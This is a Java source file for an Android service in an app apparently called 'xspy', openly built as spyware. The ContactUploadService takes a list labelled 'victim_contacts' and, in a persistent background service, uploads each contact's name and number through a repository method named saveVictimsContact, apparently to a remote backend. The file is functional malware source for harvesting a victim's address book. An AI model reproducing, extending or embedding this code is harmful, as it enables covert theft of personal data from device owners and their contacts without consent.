package com.redeyesncode.xspy.backend.services;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.redeyesncode.xspy.backend.AndroidContactModel;
import com.redeyesncode.xspy.repo.MainRepository;

import java.util.ArrayList;

public class ContactUploadService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Call the API here
                ArrayList<AndroidContactModel> contactModels = intent.getParcelableArrayListExtra("victim_contacts");

                new ApiCallSeperateThread(contactModels).execute();
            }
        }).start();
        return START_STICKY;
    }
    private class ApiCallSeperateThread extends AsyncTask<Void, Void, Void> {
        private ArrayList<AndroidContactModel> contactAsync;
        public ApiCallSeperateThread(ArrayList<AndroidContactModel> contactModels) {
            this.contactAsync = contactModels;
        }

        @Override
        protected Void doInBackground(Void... voids) {
            MainRepository mainRepository = new MainRepository();
            for (AndroidContactModel contact:
                 contactAsync) {
                mainRepository.saveVictimsContact(contact.getContactName(),contact.getContactNumber());
            }
            return null;
        }
        @Override
        protected void onPostExecute(Void aVoid) {
            // Handle any UI updates here
            Toast.makeText(ContactUploadService.this, "Uploaded Contacts Successfully !", Toast.LENGTH_LONG).show();
        }
    }
}
